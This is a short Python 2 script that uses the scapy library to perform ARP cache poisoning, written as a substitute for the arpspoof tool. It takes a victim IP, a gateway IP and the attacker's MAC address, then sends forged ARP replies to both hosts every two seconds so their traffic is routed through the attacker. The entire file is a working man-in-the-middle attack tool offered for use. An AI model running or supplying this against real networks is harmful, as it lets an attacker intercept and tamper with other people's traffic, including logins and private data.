#!/usr/bin/env python

# I don't "do" python, I admit this is horrible and kludgy, if that offends you
# please submit a patch and make it nice because I probably won't get around to
# it :)
#
# For $reasons I cannot install arpspoof from the dsniff suite in certain
# scenarios, however I do have access to scapy, thus this is my quick work
# around for that.  There is no input validation beyond there being the correct
# number of args, there are no checks that the mac address is right or that the
# IP's make sense.  They are just fed straight to scapy, use at your own
# peril.... Enjoy!

from scapy.all import *
import time
import sys

# Grab arguments in a terrible and wrong way
if len(sys.argv) != 4:
	print sys.argv[0]," <victim IP> <gateway IP> <your mac address>"
	exit()

# Populate variables
op=1 			# It's ARP
victim=sys.argv[1] 	# Victim's IP
gateway=sys.argv[2] 	# Gateway's IP
mac=sys.argv[3] 	# Attacker's Phys. Addr.

# Create two arp packets.  By poisoning both victim and gateway we will see
# traffic in both directions
victim_arp=ARP(op=op,psrc=gateway,pdst=victim,hwdst=mac)
gateway_arp=ARP(op=op,psrc=victim,pdst=gateway,hwdst=mac)

print "OK, poisoning ",victim," and ",gateway

# Run the loop
while 1:
	send(victim_arp)
	send(gateway_arp)
	time.sleep(2)


# P.S. I still can't do python.
